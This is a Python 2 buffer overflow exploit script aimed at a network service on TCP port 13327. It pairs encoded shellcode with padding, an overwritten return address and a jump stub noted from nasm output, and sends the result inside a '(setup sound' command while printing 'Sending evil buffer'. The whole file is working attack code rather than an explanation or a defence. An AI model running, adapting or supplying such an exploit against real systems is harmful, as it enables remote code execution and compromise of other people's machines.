#!/usr/bin/python
import socket


#jsp esp address:
# 0x08134597

# nasm > add eax,12
# 00000000  83C00C            add eax,byte +0xc
# nasm > jmp eax
# 00000000  FFE0              jmp eax

# \x83\xc0\x0c\xff\xe0

shellcode = ("\xd9\xc1\xbd\x36\x41\x62\xab\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x14\x83\xe8\xfc\x31\x68\x15\x03\x68\x15\xd4\xb4\x53\x70\xef"
"\xd4\xc7\xc5\x5c\x71\xea\x40\x83\x35\x8c\x9f\xc3\x6d\x0f\x72"
"\xab\x93\xaf\x63\x77\xfe\xbf\xd2\xd7\x77\x5e\xbe\xb1\xdf\x6c"
"\xbf\xb4\xa1\x6a\x73\xc2\x91\x15\xbe\x4a\x92\x69\x26\x87\x95"
"\x19\xfe\x7d\xa9\x45\xcc\x01\x9c\x0c\x36\x69\x30\xc0\xb5\x01"
"\x26\x31\x58\xb8\xd8\xc4\x7f\x6a\x76\x5e\x9e\x3a\x73\xad\xe1")


host = "127.0.0.1"
crash= shellcode + "\x41" * (4368-105) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"

